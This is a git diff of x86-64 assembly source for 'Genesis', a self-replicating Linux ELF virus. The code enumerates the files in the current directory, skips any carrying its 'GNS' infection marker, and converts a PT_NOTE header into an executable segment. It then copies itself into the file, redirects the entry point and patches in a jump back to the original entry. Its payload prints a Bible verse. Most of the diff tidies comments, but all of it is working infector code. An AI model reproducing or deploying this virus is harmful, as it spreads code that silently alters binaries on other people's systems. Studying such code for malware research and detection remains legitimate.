@@ -6,12 +6,11 @@
 ; ld genesis.o -o genesis
 
 ; Note: Because I'm weird I decided to use camelCase for 
-;       variables and macros. Jokes aside, for this I wanted
+;       constants and macros. Jokes aside, for this I wanted
 ;       to experiment by approaching ASM like an high-level
 ;       language, thus making it *hopefully* more readable
-;       for people unfamiliar with ASM.
+;       for people that are less familiar with ASM.
 ;
-; Todo: Write self at correct offset (use fseek)
 
 %include "src/Macros.asm"
 %include "src/Structs.asm"
@@ -25,22 +24,22 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ;; ENUM FILES >-----------------------------------------------------------<
 
   push  "."
-  Open  rsp,  O_RDONLY, 0x00  ; rax = Open(".", 0, 0)
+  Open  rsp,  O_RDONLY, 0x00                        ; rax = Open(".", 0, 0)
 
-  test  rax,  rax             ; if (rax < 0)
-  jl    VExitRoutine          ;   exit()
+  test  rax,  rax                                   ; if (rax < 0)
+  jl    VExitRoutine                                ;   exit()
 
-  sub   rsp,  0x10            ; alloc 4 elf_magic
-  push  rax                   ; save fd
-  push  0x00                  ; bytes read
+  sub   rsp,  0x10                                  ; alloc 4 elf_magic
+  push  rax                                         ; save fd
+  push  0x00                                        ; bytes read
   sub   rsp,  SZ_DENT
   
-  GetDents64 [rsp + SZ_DENT + 8], rsp, SZ_DENT  ; GetDents64(fd, buf, buflen)
+  GetDents64 [rsp + SZ_DENT + 8], rsp, SZ_DENT      ; GetDents64(fd, buf, buflen)
   test  rax,  rax
   jl    .EnumDirDone
 
-  xor   r9,   r9             ; Counter   = 0
-  mov   [rsp + SZ_DENT],  rax ; EndCount  = rax
+  xor   r9,   r9                                    ; Counter   = 0
+  mov   [rsp + SZ_DENT],  rax                       ; EndCount  = rax
   
   .EnumFiles:
     cmp   byte [rsp + r9 + linux_dirent64.d_type], DT_REG
@@ -69,8 +68,8 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
     ;; CHECK ALREADY INFECTED >---------------------------------------------<
 
     mov   eax, dword [r14 + 0xC]
-    cmp   eax, 0x534e4700         ; Check for "GNS" in Padding
-    je    .NextFile               ; Already Infected
+    cmp   eax, 0x534e4700                           ; Check for "GNS" in Padding
+    je    .NextFile                                 ; Already Infected
     
     ;; INFECT FILE >--------------------------------------------------------<
 
@@ -112,17 +111,14 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov     rax,  _start
   sub     rbx,  rax
 
-  mov     r10,  [rsp + stat.st_size]  ; save copy :)
+  mov     r10,  [rsp + stat.st_size]                ; save copy :)
 
-  add     rbx,  [rsp + stat.st_size]  ; host + vx
-  add     rsp,  0x90                  ; free my boi stack, he aint do nun' wrong
+  add     rbx,  [rsp + stat.st_size]                ; host + vx
+  add     rsp,  0x90                                ; free stack
 
   ; align to page size
-  add     rbx,  0xFFF                 ; add page_size-1
+  add     rbx,  0xFFF                               ; add page_size-1
   and     rbx,  -0x1000
-
-  ; fseek(rdi, 0, SEEK_END) ; <-- get & save old EOF
-  ; ...
 
   xor     rsi,  rsi
   FTruncate     rdi,  rbx
@@ -138,18 +134,18 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ; Mmap(...)
   MMap    rbx,  PROT_READWRITE, [rsp]
 
-  pop     rdi                         ; restore regs
+  pop     rdi                                       ; restore regs
   pop     r9
   pop     r10
 
-  test    rax,  rax                   ; check if mmap(...) failed
+  test    rax,  rax                                 ; check if mmap(...) failed
   js      .InfectExit
 
-  push    rax                         ; rsp         -> FileMap (ELF-HDR)
-                                      ; rsp + 0x8   -> FileSz
-                                      ; rsp + 0x10  -> Old Entry
-                                      ; rsp + 0x18  -> Program Hdr
-                                      ; rsp + 0x20  -> EOF
+  push    rax                                       ; rsp         -> FileMap (ELF-HDR)
+                                                    ; rsp + 0x8   -> FileSz
+                                                    ; rsp + 0x10  -> Old Entry
+                                                    ; rsp + 0x18  -> Program Hdr
+                                                    ; rsp + 0x20  -> EOF
 
   ;; SAVE OLD ENTRY >-------------------------------------------------------<
   
@@ -186,7 +182,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
     lea     r12,  [rax + rbx]
     mov     [rsp + 0x18], r12                         ; store prog_hdr on stack
 
-    movzx   rbx,  word [rax + rbx]  ; rbx = *(phoff + (phentsize * i))
+    movzx   rbx,  word [rax + rbx]                    ; rbx = *(phoff + (phentsize * i))
     
     cmp     rbx, PT_NOTE
     je      .ConvertPtNote
@@ -201,38 +197,35 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   .ConvertPtNote:
   
-  mov   dword [r12 + elf64_phdr.p_type],  PT_LOAD     ; p_type
-  mov   dword [r12 + elf64_phdr.p_flags], PT_FLAG_RX  ; p_flags
-  
-  mov   rcx,  VExitRoutine
-  mov   rbx,  _start
-  sub   rcx,  rbx           ; rcx = size V-Body
+  mov   dword [r12 + elf64_phdr.p_type],  PT_LOAD       ; p_type
+  mov   dword [r12 + elf64_phdr.p_flags], PT_FLAG_RX    ; p_flags
 
-  mov   qword [r12 + elf64_phdr.p_filesz],  rcx       ; p_filesz
-  mov   qword [r12 + elf64_phdr.p_memsz],   rcx       ; p_memsz
+  GetVirusSize                                          ; rcx = size V-Body
+  add   rcx,  SZ_JMP_OEP                                ; place 4 "jmp OEP" patch
 
-  mov   qword [r12 + elf64_phdr.p_offset],  r10       ; p_offset
+  mov   qword [r12 + elf64_phdr.p_filesz],  rcx         ; p_filesz
+  mov   qword [r12 + elf64_phdr.p_memsz],   rcx         ; p_memsz
 
-  mov   rbx,  r10                                     ; rbx = size H-Body
+  mov   qword [r12 + elf64_phdr.p_offset],  r10         ; p_offset
+
+  mov   rbx,  r10                                       ; rbx = size H-Body
   mov   dword [rsp + 0x20], ebx
   add   rbx,  0xc000000
 
-  mov   qword [r12 + elf64_phdr.p_vaddr],   rbx       ; p_vaddr
-  mov   qword [r12 + elf64_phdr.p_paddr],   rbx       ; p_paddr
-  mov   qword [r12 + elf64_phdr.p_align],   0x00      ; no alignment needed
+  mov   qword [r12 + elf64_phdr.p_vaddr],   rbx         ; p_vaddr
+  mov   qword [r12 + elf64_phdr.p_paddr],   rbx         ; p_paddr
+  mov   qword [r12 + elf64_phdr.p_align],   0x00        ; no alignment needed
 
   ;; WRITE SELF AT LOCATION >-----------------------------------------------<
 
-  mov   rcx,  VExitRoutine
-  mov   rbx,  _start
-  sub   rcx,  rbx             ; rcx = size V-Body
+  GetVirusSize                                          ; rcx = size V-Body
 
   sub   rsp,  0x8
   push  rdi
 
-  mov   rsi, _start           ; source address
+  mov   rsi, _start                                     ; src address
   mov   rdi,  [rsp + 0x10]  
-  add   rdi,  r10             ; destination address
+  add   rdi,  r10                                       ; dest address
   rep   movsb
 
   pop   rdi
@@ -240,24 +233,24 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
 
-  ; patch the jmp
-  mov   rcx,  VExitRoutine
-  mov   rbx,  _start
-  sub   rcx,  rbx           ; rcx = size V-Body
+  GetVirusSize                                          ; rcx = size V-Body
 
   mov   rbx,  [rsp]   
   add   rbx,  [rsp + 0x20]
   add   rbx,  rcx
 
-  mov   byte  [rbx],  0xe9  ; jmp
-  mov   rax,  [rsp + 0x10]
-  mov   dword [rbx + 0x01],  eax   ; addr
-
+  mov   byte  [rbx + 0],    0x48
+  mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
+  mov   rcx,  [rsp + 0x10]                              ;                |
+  mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
+  mov   byte  [rbx + 10],   0xFF 
+  mov   byte  [rbx + 11],   0xE0                        ; jmp rax
+  
   ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
   mov   rbx,  r10
   add   rbx,  0xc000000
-  mov   dword [rdx + elf64_hdr.e_entry], ebx       ; patch entry
+  mov   dword [rdx + elf64_hdr.e_entry], ebx            ; patch entry
   
   ;; WRITE SIGNATURE >------------------------------------------------------<
   
@@ -283,7 +276,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   jmp .Payload
   ;; EXEC PAYLOAD (PRINT STDOUT) >------------------------------------------<
 
-  .msg:    ; idk why I made it a byte array... xD
+  .msg:    ; idk why I made it a byte array...
     	db	0x47, 0x65, 0x6e, 0x65, 0x73, 0x69, 0x73, 0x20, 0x31, 0x3a, 
 	    db	0x32, 0x32, 0x20, 0x7e, 0x20, 0x47, 0x6f, 0x64, 0x20, 0x62, 
 	    db	0x6c, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x74, 0x68, 0x65, 
